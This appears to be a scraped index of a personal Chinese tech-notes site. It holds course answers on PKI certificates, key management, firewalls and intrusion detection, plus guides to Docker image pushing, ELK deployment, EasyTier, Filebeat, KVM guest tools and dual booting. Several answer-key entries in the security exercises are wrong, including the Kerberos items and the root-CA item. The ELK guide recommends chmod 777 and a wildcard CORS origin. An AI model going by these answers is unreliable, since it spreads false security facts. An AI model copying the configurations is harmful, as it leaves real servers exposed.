B.公钥 C.护照 D.驾照 B 2.用户的 （）不能出现在数字证书中。A.公钥 B.私钥 C.组织名 D.人名 B （）可以签发数字证书。A. CA B.政府 C.小店主 D.银行 A （）标准定义数字证书结构。A. X.500 B. TCP/IP C. ASN.1 D. X.509 D RA （）签发数字证书。A.可以 B.不必 C.必须 D.不能 D 6.CA使用 （）签名数字证书。 A.用户的公钥 B.用户的私钥 C.自己的公钥 D.自己的私钥 D 7.要解决信任问题，需使用（）。 A. 公钥 B.自签名证书 C.数字证书 D.数字签名 C 8.CRL是（）的。 A.联机 B. 联机和脱机 C.脱机 D.未定义 C 9.OCSP是（）的。A.联机。B.联机和脱机 C.脱机 D.未定义 A 10.最高权威的CA称为（）。 A. RCA B. RA C. SOA D. ARA C 思考题 1.数字证书的典型内容是什么？ 由权威机构CA认证，是证书所有者及其持有签名的集合。 主要包括：证书有效期、版本信息、证书序列号、证书使用的签名算法、证书发行机构名、所有人名称、公钥、发行者签名。 2.CA与RA的作用是什么？ CA签发证书、RA审查用户的证书申请。 3.简述交叉证书的作用。 交叉证书的认证本质是一种分布式的认证。能够使不同PKI域的CA和最终用户能互动。 4.简述撤销证书的原因。 (1) 数字证书持有者报告该证书中指定公钥对应的私钥被破解（被盗）； (2) CA发现签发数字证书是出错； (3) 证书持有者离职，而证书为其在职期间签发的。 5.列出创建数字证书的4个关键步骤。 密钥生成、注册、验证、证书生成。 6.CA分层后面的思想是什么？ RCA不需要管理所有的数字证书，可以将任务委托给二级机构，依次进行。 7.描述保护数字证书的机制。 撤销、漫游等。 8.为什么需要自签名证书？ 用于内部环境或者测试。 CRL、OCSP、SCVP的主要区别是什么？ CRL是脱机的；而OCSP、SCVP是联机的。SCVP相比OCSP功能更多。 10.请看这样一种情况：攻击者A创建了一个证书，放置一个真实的组织名(假设为银行B)及攻击者自己的公钥。你在不知道是攻击者在发送的情形下，得到了该证书，误认为该证书来自银行B.请问如何防止该问题的产生？ 向更高一级的CA验证银行B的身份和公钥是否匹配。 第十章 网络加密与密钥管理 填空题 1.网络加密方式有4种，它们分别是 和 链路加密、节点加密、端到端加密、混合加密。 2.在通信网的数据加密中，密钥可分为 和 基本密钥、会话密钥、密钥加密密钥、主机主密钥。 3.密钥分配的基本方法有 和 等。 利用安全信道、双钥体制、量子技术。 4.在网络中，可信第三方TTP的角色可以由（）、（）、（）和 等来承担(请任意举出4个例子)。 5.按照协议的功能分类，密码协议可以分为 和 认证建立协议、密钥建立协议、认证的密钥建立协议。 Diffie-Hellman密钥交换协议不能抵抗 攻击。 中间人攻击。 7.Kerberos 提供 A.加密 B. SSO C.远程登录 D.本地登录 A 8.在Kerberos中，允许用户访问不同应用程序或服务器的服务器称为 A. AS B. TGT C. TGS D.文件服务器 A 9.在Kerberos中， 与系统中的每个用户共享唯一一个口令。 A. AS B. TGT C. TGS D.文件服务器 C 思考题 1.网络加密有哪几种方式？请比较它们的优缺点。 网络加密的方式有4种分别是链路加密、节点加密、端到端加密、混合加密。 链路加密的优点： (1) 加密对用户是透明的，通过链路发送的任何信 息在发送前都先被加密。 (2) 每个链路只需要一对密钥。 (3) 提供了信号流安全机制。 缺点：数据在中间结点以明文形式出现，维护结点安全性的代价较高。 节点加密的优点： （1）消息的加、解密在安全模块中进行，这使消息内容不会被泄密 （2）加密对用户透明 缺点： （1）某些信息（如报头和路由信息）必须以明文形式传输 （2）因为所有节点都必须有密钥，密钥分发和管理变的困难 端到端加密的优点： ① 对两个终端之间的整个通信线路进行加密 ② 只需要2台加密机，1台在发端，1台在收端 ③ 从发端到收端的传输过程中，报文始终以密文存在 ④ 消息报头（源/目的地址）不能加密，以明文传送 ⑤ 只需要2台加密机，1台在发端，1台在收端 ⑥ 从发端到收端的传输过程中，报文始终以密文存在 ⑦ 比链路和节点加密更安全可靠，更容易设计和维护 缺点：不能防止业务流分析攻击。 混合加密的是链路和端到端混合加密组成。 优点：从成本、灵活性和安全性来看，一般端到端加密方式较有吸引力。对于某些远程机构，链路加密可能更为合适。 缺点：信息的安全设计较复杂。 2.请分析比较硬件加密和软件加密的优缺点。 3.密钥管理包含哪些内容？密钥管理需要借助于哪些密码技术来完成？ 密钥的保护、存储和备份；吊销和销毁。单钥密码、双钥密码、证书。 4.密钥有哪些种类？它们各自的用途是什么？请简述它们之间的关系。 基本密钥或称初始密钥其用途是与会话密钥一起去启动和控制某种算法所构造的密钥产生器，产生用于加密数据的密钥流。 会话密钥其用途是使人们可以不必繁琐的更换基本密钥，有利于密钥的安全和管理。 密钥加密密钥用途是用于对传送的会话或文件密钥进行加密时采用的密钥，也称为次主密钥、辅助密钥或密钥传送密钥。 主机主密钥作用是对密钥加密密钥进行加密的密钥，存储于主机处理器中。 5.一个好的密钥应该具备哪些特性？ 真正随机、等概率；避免弱密钥；密钥不能选的过长以便于记忆和存储；采用杂凑技术。 6.在实际系统中，如何产生和选择好的密钥？ 主机密钥： 密钥加密密钥： 会话密钥和数据加密密钥。 7.密钥分配的基本模式有哪些？ 基本方法：利用安全信道、利用双钥体制、利用量子技术。 基本模式：点对点传输、密钥分配中心KDC、密钥传递中心KTC。 8.密钥分配协议有哪些种类？在密钥交换时为什么需要进行身份认证？ 最常用的是kerberos协议。防止进行中间人攻击。 9.在实际工作中，有哪些密钥分配的方法？有哪些自动分发密钥的方法？ 10.什么是隐式证实公钥系统？它可以分为哪几类？ 不直接传送用户的密钥，而是从传送中可以构建密钥。主要分为基于身份的公钥和自证实公钥。 11.在密码系统中，密钥是如何进行保护、存储和备份的？ 保护：分级保护密钥，保证极少数密钥能以明文形式存储在严密物理保护的密码器件中。 存储：要保证密钥的机密性、认证性和完整性。基于个人存储；ROM卡；口令加密存储；口令确定性算法生成。 备份：好的办法是共享密钥协议。 12.在实际系统中，如何对密钥进行控制？单钥体制中的密钥控制技术有哪些？ 控制密钥的生成、输入、使用、更新、注销和销毁、恢复等。 13.密钥如何撤销和销毁？ 撤销：通常需要通知KDC或通信方，撤销该密钥。 销毁：物理介质的需要用碎纸机这类设备销毁；存储数据需要多次重写。 第十一章 无线网络安全 第十二章 防火墙技术 填空题 1、防火墙应位于C A、公司网络内部 B、公司网络外部 C、公司网络与外部网络 D、都不对 2、应用网关的安全性 B 包过滤防火墙。 A、不如 B、超过 C、等于 D、都不对 3、防火墙可以分为静态包过滤、动态包过滤、电路级网关、应用级网关、状态检查包过滤、切换代理和空气隙7种类型。 4、静态包过滤防火墙工作于OSI模型的网络层上，他对数据包的某些特定域进行检查，这些特定域包括：数据源地址、目的地址、应用或协议、源端口号、目的端口号。 5、动态包过滤防火墙工作于OSI模型的网络层上，他对数据包的某些特定域进行检查，这些特定域包括数据源地址、目的地址、应用或协议、源端口号、目的端口号。 6、电路级网关工作于OSI模型的会话层上，它检查数据包中的数据分别为源地址、目的地址、应用或协议、源端口号、目的端口号和握手信息及序列号。 7、应用级网关工作于OSI模型的应用层上，它可以对整个数据包进行检查，因此其安全性最高。 8、状态检测防火墙工作于OSI模型的全部7层上，所以在理论上具有很高的安全性，但是现有的大多数状态检测防火墙只工作于网络层上，因此其安全性与包过滤防火墙相当。 9、切换代理在连接建立阶段工作于OSI模型的会话层上，当连接建立完成值后，再切换到动态包过滤模式，即工作于OSI模型的网络层上。 10、空气隙防火墙也称作安全网闸，它在外网和内网之间实现了真正的隔离。 思考题 1.防火墙一般有几个接口？什么是防火墙的非军事区（DMZ）？它的作用是什么？ 答：防火墙一般有3个或3个以上的接口。网关所在的网络称为‘非军事区’（DZM）。网关的作用是提供中继服务，以补偿过滤器带来的影响。 2.为什么防火墙要具有NAT功能？在NAT中为什么要记录端口号？ 答：使用NAT的防火墙具有另一个优点，它可以隐藏内部网络的拓扑结构，这在某种程度上提升了网络的安全性。在NAT中记录端口号是因为在实现端口地址转换功能时，两次NAT的数据包通过端口号加以区分。 3.系统中提到了NAT的几种实现方式，试着给出M-N的NAT转换算法。 动态NAT、静态NAT、端口多路复用PAT。 4.防火墙必须同时兼有路由器功能吗？为什么？ 必须。因为防火墙本身是连接两个网络的，本身必须具有转发功能。 5.简述静态包过滤防火墙的工作原理，并分析其优缺点。动态包过滤防火墙与静态包过滤防火墙的主要区别是什么？ 根据静态规则过滤数据包。性能好、成本低；安全性低、缺少状态感知能力、容易遭受IP欺骗、创建访问控制策略难。 6.分组过滤的3大操作是什么？ 7.结合实际操作，描述动态防火墙在TCP连接终止时的状态转换。 8.电路级网关与包过滤防火墙有何不同？简述电路级网关的优缺点。 9.应用级网关与电路级网关有何不同？简述应用级网关的优缺点。 答：与电路级网关不同的是应用级网关必须针对每个特定的服务运行一个特定的代理，它只能对特定服务所生成的数据包进行传递和过滤。 应用级网关的优点： 在已有的安全模型中安全性较高 具有强大的认证功能 具有超强的日志功能 应用级网关防火墙的规则配置比较简单 缺点： 灵活性差 配置复杂 性能不高 14.防火墙有什么局限性？ 答：防火墙是Internet安全的最基本组成部分，但对于内部攻击以及绕过防火墙的连接却无能为力，另外，攻击者可能利用防火墙为某些业务提供的特殊通道对内部网络发起攻击，注入病毒或木马。 15.软件防火墙与硬件防火墙之间的区别是什么？ 答：软件防火墙是利用CPU的运算能力进行数据处理，而硬件防火墙使用专用的芯片级处理机制。 第十三章 入侵检测技术 填空题 1、根据数据源的来源不同，IDS可分为基于网络NIDS 、基于主机HIDS和两种都有DIDS种类型。 2、一个通用的IDS模型主要由数据收集、检测器、知识库和控制器4部分组成。 3、入侵检测分为3个步骤，分别为信息收集、数据分析和响应。 4、一个NIDS的功能结构上至少包含事件提取、入侵分析、入侵响应和远程管理4部分功能 5、DIDS通常由数据采集构建 、通信传输构建、入侵检测分析、应急处理的构建和用户管理构建5个构建组成。 6、IDS控制台主要由日志检索、探测器管理、规则管理、日志报表和用户管理5个功能模块构成。 7、HIDS常安装于被保护的主机，NIDS常安装于网络入口处。 8、潜在人侵者的可以通过检查蜜罐日志来获取。 9、吸引潜在攻击者陷阱为蜜罐。 思考题 1、入侵检测系统的定义是什么 能对企图入侵、正在入侵和已经发生的入侵行为进行识别的系统。 2、入侵检测系统按照功能可分为哪几类，有哪些主要功能? 答：功能构成包含：事件提取、入侵分析、入侵响应、远程管理4个部分功能 1、网络流量的跟踪与分析功能 2、已知攻击特征的识别功能 3、异常行为的分析、统计与响应功能 4、特征库的在线和离线升级功能 5、数据文件的完整性检查功能 6、自定义的响应功能 7、系统漏洞的预报警功能 8、IDS探测器集中管理功能 3、一个好的IDS应该满足哪些基本特征？ 答：先进的响应能力；对性能损失小；无人监管也能正常运行；自身安全；给管理者提供完整信息；可管理性；可扩展性好；支持IP、TCP重组；支持TCP状态检测；支持应用层协议解码；配置简单，非专业人员也可使用；兼容性好。 4、常用的入侵检测模型 异常检测模型、误用检测模型等。 5、分析基于异常和基于误用的优缺点 基于异常的检测，优点是能识别新的入侵。 误用，准确率高。 6、什么是异常检测，基于异常检测原理的入侵检测方法有哪些？ 答：异常检测技术又称为基于行为的入侵检测技术，用来识别主机或网络中的异常行为。通过收集操作活动的历史数据，建立代表主机、用户或网络连接的正常行为描述，判断是否发生入侵。 统计异常检测方法 特征选择异常检测方法 基于贝叶斯网络异常检测方法 基于贝叶斯推理异常检测方法 基于模式预测异常检测方法 7、什么是误用检测，基于误用检测原理的入侵检测方法有哪些？ 答：误用检测技术又称为基于知识的检测技术。它通过对已知的入侵行为和手段进行分析，提取检测特征，构建攻击模式或攻击签名，判断入侵行为。 基于条件的概率误用检测方法 基于专家系统误用检测方法 基于状态迁移分析误用检测方法 基于键盘监控误用检测方法 基于模型误用检测方法 8、简述NIDS和HIDS的区别 NIDS的目标是网络传输中的入侵；HIDS的目标是主机中的入侵。 NIDS和HIDS用到的技术不一样，NIDS的技术包括IP重组、TCP重组、TCP状态检测、协议分析、零复制技术、蜜罐等，优点是成本低、攻击者转移证据困难、实时监测和响应、能够检测未成功的攻击、独立于操作系统；HIDS的技术包括文件和注册表检测、内核编程防护技术（主要是钩子）、IIS保护技术、文件完整性分析技术等。 9、蜜网和蜜罐的作用？有什么优势？ 设置蜜罐可以吸引攻击者的攻击，收集攻击者的攻击动作信息，以及给管理员反应攻击的时间。 优势：减少分析的数据量，也能了解网络所受的攻击。虚拟蜜罐还可以支持挂起功能，冻结被攻击机。 10、蜜网和蜜罐的作用是什么，它们在检测入侵方面有什么优势？ 蜜罐的作用： 把潜在入侵者的注意力从关键系统移开 收集入侵者的动作信息 设法让攻击者停留一段时间，使管理员能检测到它并采取相应的措施。 蜜网的作用： 蜜网在确保不被入侵者发现诱骗的前提下，尽可能多地捕获攻击行为信息 Honeynet向Internet发起的连接进行跟踪，一旦Honeynet达到了规定的向外的连接数，防火墙将阻断任何后续的连接，并且及时向系统管理员发出警告信息 IDS在数据链路层对蜜网中的网络数据流进行监控，分析和抓取以便将来能够重现攻击行为，同时在发现可疑举动时报警。 蜜罐和蜜网能从现存的各种威胁中提取有用的信息，发现新型的攻击工具，确定攻击模式并研究攻击者的攻击动机，从而确定更好的对策。 11、简述NIDS数据流程。 NIDS是基于网络的入侵检测系统，能够在网卡处截获网络中的数据包。由IP重组模块和TCP重组模块重组数据包，提交到内容分析模块，根据分析结果对数据包响应，并将事件整理提交到控制台，再交付到数据库中。 12、IDS在自身安全设计上注意哪些问题 首先IDS本身设计必须是安全的，自身要能够防护各种攻击，要做好IDS自身的登录认证，间隔性地检查和修复软件自身漏洞（如缓冲区溢出等），IDS自身的数据的存储和传输应是加密的（如安全套接层等），还要保证其完整性。也要考虑自身一旦被攻击的处理，比如断开网口等，保存数据。 13、画出IDS在实际网络中的部署图 14、简述IDS发展方向 宽带高速实时监测技术、大规模分布式检测技术、数据挖掘技术、更先进的检测算法、入侵响应技术。 第十四章 VPN技术 第十五章 身份认证技术 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"5.其他/学校课程/计算机组成原理.html":{"url":"5.其他/学校课程/计算机组成原理.html","title":"计算机组成原理","keywords":"","body":"一. 单选题（共10题，100分） 1. (单选题) 至今为止,计算机中的所有信息仍采用二进制方式表示的理由是_。 A. 节约元件 B. 运算速度快 C. 物理器件性能所致 D. 信息处理方便 我的答案: C:物理器件性能所致;正确答案: C:物理器件性能所致; 10分 2. (单选题) 计算机硬件能直接执行的只有_。 A. 符号语言 B. 机器语言 C. 汇编语言 D. 高级语言 我的答案: B:机器语言;正确答案: B:机器语言; 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"5.其他/Docker推送镜像到仓库.html":{"url":"5.其他/Docker推送镜像到仓库.html","title":"Docker推送镜像到仓库","keywords":"","body":"1、Docker hub创建仓库 官网注册账号：https://hub.docker.com/ 登陆后进入仓库界面创建仓库 输入仓库名和描述(可选)进行创建，记住仓库选择公开 2、在本地shell登录docker [root@localhost ~]# docker login Log in with your Docker ID or email address to push and pull images from Docker Hub. If you don't have a Docker ID, head over to https://hub.docker.com/ to create one. You can log in with your password or a Personal Access Token (PAT). Using a limited-scope PAT grants better security and is required for organizations using SSO. Learn more at https://docs.docker.com/go/access-tokens/ Username: xxxx Password: WARNING! Your password will be stored unencrypted in /home/feiyu/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credential-stores Login Succeeded 3、查看需推送镜像 [root@localhost ~]# docker images REPOSITORY TAG IMAGE ID CREATED SIZE centos 7.9.2009 eeb6ee3f44bd 2 years ago 204MB 4、给镜像修改标签与名称 规范：docker tag 原镜像名:原镜像tag dockerhub用户名/仓库名:标签 [root@localhost ~]# docker tag centos:7.9.2009 user/centos7.9:stable [root@localhost ~]# docker images ls REPOSITORY TAG IMAGE ID CREATED SIZE user/centos7.9 stable 853aab1a35f1 27 minutes ago 204MB 5、Push到DockerHub仓库 [root@localhost ~]# docker push user/centos7.9:stable 之后可以在自己dockerhub账号的仓库中看到push的镜像，测试也可以正常pull下来到本地 6、配置代理 Dockerd 代理 在执行docker pull时，是由守护进程dockerd来执行。因此，代理需要配在dockerd的环境中。而这个环境，则是受systemd所管控，因此实际是systemd的配置。 sudo mkdir -p /etc/systemd/system/docker.service.d sudo touch /etc/systemd/system/docker.service.d/proxy.conf 在这个proxy.conf文件（可以是任意*.conf的形式）中，添加以下内容： [Service] Environment=\"HTTP_PROXY=http://127.0.0.1:7893/\" Environment=\"HTTPS_PROXY=http://127.0.0.1:7893/\" Environment=\"NO_PROXY=localhost,127.0.0.1,.example.com\" 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:50 "},"5.其他/Docker部署elk.html":{"url":"5.其他/Docker部署elk.html","title":"Docker部署elk","keywords":"","body":"零、概述 整体使用docker compose部署elk 常用命令 docker-compose up -d # 启动容器 docker-compose down # 关闭容器 docker ps -a # 查看容器（包括停止的） docker ps # 查看容器（不包括停止的） docker logs 容器名 # 查看容器运行日志 docker logs -f 容器名 # 实时显示容器运行日志 docker restart/start/stop 容器名 # 重启/启动/停止容器 docker run -itd --name 容器名 镜像名 # 运行容器 docker exec -it 容器名 /bin/bash # 进入容器 docker-compose文件 version: \"3.0\" services: elasticsearch: image: elasticsearch:8.15.0 container_name: elasticsearch restart: always #entrypoint: /bin/bash volumes: - ./elasticsearch/data:/usr/share/elasticsearch/data environment: - ES_JAVA_OPTS=-Xms2g -Xmx24g - discovery.type=single-node # 是否开启用户密码验证，初始配置时可先设置为false - xpack.security.enabled=true ports: - \"9200:9200\" - \"9300:9300\" networks: elk: ipv4_address: 172.31.0.2 kibana: image: kibana:8.15.0 container_name: kibana restart: always #entrypoint: /bin/bash depends_on: - elasticsearch environment: - ELASTICSEARCH_HOSTS=http://elasticsearch:9200 - I18N_LOCALE=zh-CN ports: - \"5601:5601\" networks: elk: ipv4_address: 172.31.0.3 logstash: image: logstash:8.15.0 container_name: logstash restart: always extra_hosts: elasticsearch: 日志服务器(elk)ip ports: - \"5044:5044\" volumes: - ./logstash/logs:/usr/share/logstash/logs - ./logstash/data:/usr/share/logstash/data - ./logstash/config:/usr/share/logstash/config - ./logstash/pipeline:/usr/share/logstash/pipeline networks: elk: ipv4_address: 172.31.0.4 networks: elk: driver: bridge ipam: config: - subnet: 172.31.0.0/16 一、部署elk 创建elk目录并进入 mkdir elk cd elk 将docker-compose文件放入 vim docker-compose-yml 将上述配置文件复制进去 启动容器 docker-compose up -d 查看容器运行状态 root@localhost:~/elk$ docker ps CONTAINER ID IMAGE COMMAND CREATED STATUS PORTS NAMES 064f34707685 logstash:8.15.0 \"/usr/local/bin/dock…\" 20 hours ago Up 16 hours 0.0.0.0:5044->5044/tcp, :::5044->5044/tcp, 9600/tcp logstash 380abab64dbe elasticsearch:8.15.0 \"/bin/tini -- /usr/l…\" 23 hours ago Up 21 hours 0.0.0.0:9200->9200/tcp, :::9200->9200/tcp, 0.0.0.0:9300->9300/tcp, :::9300->9300/tcp elasticsearch 6a725eb9c3f7 kibana:8.15.0 \"/bin/tini -- /usr/l…\" 23 hours ago Up 23 hours 0.0.0.0:5601->5601/tcp, :::5601->5601/tcp kibana STATUS是运行状态 若有容器无法正常运行，先关闭容器 docker-compose down 情况一：elasticsearch容器重启 尝试给文件夹赋权和归属 # 分别执行 sudo chmod 777 elasticsearch sudo chmod 777 elasticsearch/data sudo chown -R user:user elasticsearch 重启容器 docker restart elasticsearch 情况二：logstash容器重启 尝试给文件夹赋权和归属 # 分别执行 sudo chmod 777 logstash sudo chmod 777 logstash/data sudo chmod 777 logstash/logs sudo chmod 777 logstash/data sudo chmod 777 logstash/config sudo chmod 777 logstash/pipeline sudo chown -R user:user logstash 重启容器在看是否解决 docker restart logstash 检查配置文件是否有错误 sudo vim logstash/pipeline/logstash.conf 放入以下内容 input { beats { port => 5044 } } filter { json { source => \"message\" } if [tags][0] in [\"nginx\", \"httpd\", \"apache\", \"mysql\", \"router\", \"switch\"] { mutate { add_field => { \"index_name\" => \"%{[host][name]}@%{[tags][1]}-%{[tags][0]}-%{+YYYY.MM.dd}\" } } } else { mutate { add_field => { \"index_name\" => \"non_hosts_log\" } } } } output { elasticsearch { hosts => [\"http://日志服务器ip:9200\"] index => \"%{index_name}\" user => \"elastic\" password => \"elastic_password\" } stdout { codec => rubydebug } } 重启容器在看是否解决 docker restart logstash 二、配置elk用户密码 运行容器 docker-compose up -d 修改配置文件 复制容器内配置文件到本地 sudo docker cp elasticsearch:/usr/share/elasticsearch/config/elasticsearch.yml elasticsearch/config/elasticsearch.yml 添加以下内容 http.cors.enabled: true http.cors.allow-origin: \"*\" 把修改后的文件拷贝回容器 sudo docker cp elasticsearch/config/elasticsearch.yml elasticsearch:/usr/share/elasticsearch/config/elasticsearch.yml #重启容器 docker restart elasticsearch 进入elasticsearch容器修改密码 docker exec -it elasticsearch /bin/bash #进入容器 ./bin/elasticsearch-setup-passwords auto #自动生成密码 #修改elastic为指定的密码 curl -XPOST -u elastic 'http://localhost:9200/_security/user/elastic/_password' -H \"Content-Type: application/json\" -d' { \"password\": \"elastic_password\" } ' #修改kibana为指定的密码 curl -XPOST -u kibana 'http://localhost:9200/_security/user/kibana/_password' -H \"Content-Type: application/json\" -d' { \"password\": \"kibana_password\" } ' # 修改后exit退出容器，可在浏览器验证密码是否正确（http://192.168.1.11:9200） 修改kibana配置文件kibana.yml sudo docker cp kibana:/usr/share/kibana/config/kibana.yml kibana/kibana.yml vim kibana/kibana.yml # 添加以下两行内容，仅可用于连接elasticsearch并与之通信, 不能用于kibana登录 elasticsearch.username: \"kibana\" elasticsearch.password: \"kibana_password\" # 把修改后的文件拷贝到容器 docker cp kibana/kibana.yml kibana:/usr/share/kibana/config/kibana.yml docker restart kibana #重启kibana容器 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:51 "},"5.其他/Easytier安装与配置.html":{"url":"5.其他/Easytier安装与配置.html","title":"Easytier安装与配置","keywords":"","body":"下载 GitHub地址：EasyTier. 下载预编译的二进制文件 访问 GitHub Release 页面 下载适用于您操作系统的二进制文件。Release 压缩包中同时包含命令行程序和图形界面程序。 解压安装 # 下载 wget https://github.com/EasyTier/EasyTier/releases/download/v2.1.1/easytier-linux-x86_64-v2.1.1.zip # 解压 unzip easytier-linux-x86_64-v2.1.1.zip -d ~/ # 添加软链接 cd ~/ sudo ln -s easytier-linux-x86_64/easytier-cli /usr/local/bin/ sudo ln -s easytier-linux-x86_64/easytier-core /usr/local/bin/ # 验证 easytier-core --version easytier-cli --version 使用指南 无公网IP组网 EasyTier 支持共享公网节点进行组网。目前已部署共享的公网节点 tcp://public.easytier.top:11010。 使用共享节点时，需要每个入网节点提供相同的 --network-name 和 --network-secret 参数，作为网络的唯一标识。 以双节点为例，节点 A 执行： sudo easytier-core -i 10.144.144.1 --network-name abc --network-secret abc -e tcp://public.easytier.top:11010 节点 B 执行 sudo easytier-core --ipv4 10.144.144.2 --network-name abc --network-secret abc -e tcp://public.easytier.top:11010 命令执行成功后，节点 A 即可通过虚拟 IP 10.144.144.2 访问节点 B。 双节点组网 假设双节点的网络拓扑如下 在节点 A 上执行： ```shell sudo easytier-core --ipv4 10.144.144.1 ``` 命令执行成功会有如下打印。 在节点 B 执行 ```shell sudo easytier-core --ipv4 10.144.144.2 --peers udp://22.1.1.1:11010 ``` 测试联通性 两个节点应成功连接并能够在虚拟子网内通信 ```shell ping 10.144.144.2 ``` 使用 easytier-cli 查看子网中的节点信息 ```shell easytier-cli peer ``` ```shell easytier-cli route ``` ```shell easytier-cli node ``` 添加systemd单元 [Unit] Description=easytier After=network.target [Service] Type=simple ExecStart=easytier-core --hostname test_name -i 10.144.144.1 --network-name abc --network-secret abc -e tcp://public.easytier.top:11010 WorkingDirectory=/path/to/you/easytier-linux-x86_64 User=root Group=root [Install] WantedBy=multi-user.target 启动easytier并添加开机自启 # 重载systemd sudo systemctl daemon-reload # 重启easytier sudo systemctl restart easytier.service # 开机自启 sudo systemctl enable easytier.service 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-08 16:52 "},"5.其他/Filebeat安装配置.html":{"url":"5.其他/Filebeat安装配置.html","title":"Filebeat安装配置","keywords":"","body":"Ubuntu 添加ElasticSearch的GPG密钥 wget -qO - https://artifacts.elastic.co/GPG-KEY-elasticsearch | sudo apt-key add - 添加ElasticSearch的APT存储库echo \"deb https://artifacts.elastic.co/packages/oss-8.x/apt stable main\" | sudo tee -a /etc/apt/sources.list.d/elastic-8.x.list 更新APT软件包索引sudo apt update 安装filebeatsudo apt install filebeat 配置filebeat sudo vim /etc/filebeat/filebeat.yml 全部替换为以下内容 processors: - add_cloud_metadata: ~ - add_docker_metadata: ~ # ============================== Filebeat inputs =============================== filebeat.inputs: - type: log enabled: true paths: - /var/log/nginx/*.log # tags更改分别更改为日志应用和主机ip，后续分别对应日志文件名称 tags: [\"nginx\", \"[主机ip]\"] filebeat.config: modules: path: ${path.config}/modules.d/*.yml reload.enabled: false # ============================== Filebeat output =============================== # 直接发送给elasticsearch #output.elasticsearch: # username: 'elastic' # password: 'elastic_password' # hosts: [\"http://日志服务器ip:9200\"] # indices: # - index: \"nginx-%{+yyyy.MM.dd}\" # 发送给logstash output.logstash: hosts: [\"日志服务器ip:5044\"] enabled: true 启动filebeatsudo systemctl enable filebeat sudo systemctl start filebeat Centos 一. 直接yum方式安装 yum install filebeat 二. 配置filebeat sudo vim /etc/filebeat/filebeat.yml 全部替换为以下内容 processors: - add_cloud_metadata: ~ - add_docker_metadata: ~ # ============================== Filebeat inputs =============================== filebeat.inputs: - type: log enabled: true paths: - /var/log/nginx/*.log # tags更改分别更改为日志应用和主机ip，后续分别对应日志文件名称 tags: [\"nginx\", \"[主机ip]\"] filebeat.config: modules: path: ${path.config}/modules.d/*.yml reload.enabled: false # ============================== Filebeat output =============================== # 直接发送给elasticsearch #output.elasticsearch: # username: 'elastic' # password: 'elastic_password' # hosts: [\"http://日志服务器ip:9200\"] # indices: # - index: \"nginx-%{+yyyy.MM.dd}\" # 发送给logstash output.logstash: hosts: [\"日志服务器ip:5044\"] enabled: true 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"5.其他/kvm虚拟机配置增强功能.html":{"url":"5.其他/kvm虚拟机配置增强功能.html","title":"kvm虚拟机配置增强功能","keywords":"","body":"qemu/kvm linux 虚拟机配置（共享剪切版，文件拖拽进虚拟机） 注意：这里说的是虚拟机的配置，不是宿主机的配置 sudo apt install qemu-guest-agent spice-vdagent sudo yum install qemu-guest-agent spice-vdagent -y systemctl enable qemu-guest-agent systemctl enable spice-vdagent qemu-guest-agent，spice-vdagent 安装后体验直线上升，可以双向拖拽，共享剪切版，自适应缩放 virt-what 可以查询虚拟机使用的虚拟化技术 sudo apt install virt-what 赣ICP备2023008387号-1 赣公网安备36052102100040号 Copyright ©2022 - 2024 By Feiyu最近一修改时间： 2025-04-06 16:47 "},"5.其他/Linux+Windows双系统搭建.html":{"url":"5.其他/Linux+Windows双系统搭建.html","title":"Linux+Windows双系统搭建","keywords":"","body":"准备工作 在正式装系统之前，我们还需要做一些准备工作： 关闭 Windows 的快速启动 这个功能的作用是在于关机的时候不完全断电，类似将系统处于「休眠」状态，这样可以让开机更加迅速。但这也就导致了只能使用 Windows 系统。 关闭 BIOS 的 Secure Boot 的功能 在默认情况下，UEFI 固件只会加载那些被签名的引导程序。在缺少 Secure Boot 功能的传统 PC 机上，恶意的后门程序可以加载自身，进而摇身一变伪装成一个引导程序。这样的话，BIOS 就会在启动的时候加载后门程序，这样它就可以躲过操作系统，把自己隐藏得很深。 但是不得不说，这对我们安装 Linux 造成了很大的困扰，也是直接导致我们重启到 Windows 10 后进不去 Linux 的原因。 首先我们要关闭这个功能：进入 BIOS 找到 Secure Boot，选择 disabled，这样就关闭了。当然，有些人进入 BIOS 会发现 Secure Boot 这个选项是灰色的（比如我的就是），这时你需要先给你的 BIOS 设一个密码，然后就能关 Secure Boot 了。 安装 Linux 所有的准备都已经完成，这时就可以准备刻录 U 盘了，不推荐 UltraISO，经亲测，软碟通仅刻录 Ubuntu 能成功，其它绝大多数发行版都会失败。推荐「Rufus」和「USBWriter」，这两个软件都可以。 刻录完成后，重启按 f12，选择从 USB 设备启动，对于绝大多数发行版来说一路回车就行了，只需要注意一点：在选择挂载 boot 位置的时候，一定要挂载在 efi 分区，别的都不行。 重启之后，不出意外的话，你会直接进入 Windows 10，不要担心，这时 Linux 已经安装成功了，我们只需要将引导文件替换一下。 替换引导文件 先用 DG 打开 EFI 分区，你会看到多了一个文件夹，名称取决于你安装的是哪一个发行版。我安装的是 Manjaro Linux，名称就是 Manjaro，打开之后会发现里面有一个名为 grubx64.efi 的文件，这就是启动 Linux 的引导文件。和 Windows 10 的 bootmgfw.efi 类似，我们想要用 grubx64.efi 引导代替掉 bootmgfw.efi，这样就可以用 GRUB 引导了。步骤： 进入管理员命令行。方法：win + x，再按 a 输入 bcdedit /set {bootmgr} path \\EFI\\Manjaro\\grubx64.efi。提示操作成功的话，就完成了。 注：经人提醒，如果输入以上命令提示「参数错误」的话，将 {bootmgr} 改为 ‘{bootmgr}’，原因是 PowerShell 和 CMD 语法的差别。 至此，如果你安装的是除 Arch 之外绝大多数发行版，那么接下来就和你没有啥关系了，你已经成功了，好好享受吧！ 开机之后会发现进入 GRUB 的引导了，通常会包含至少三个选项（以 Manjaro 举例）：Manjaro、Manjaro 高级选项和 Windows Manager。这就代表你已经完美的解决了 Windows 和 Linux 双系统引导的问题。 修复 Windows 引导 这一点是我安装 Arch Llinux 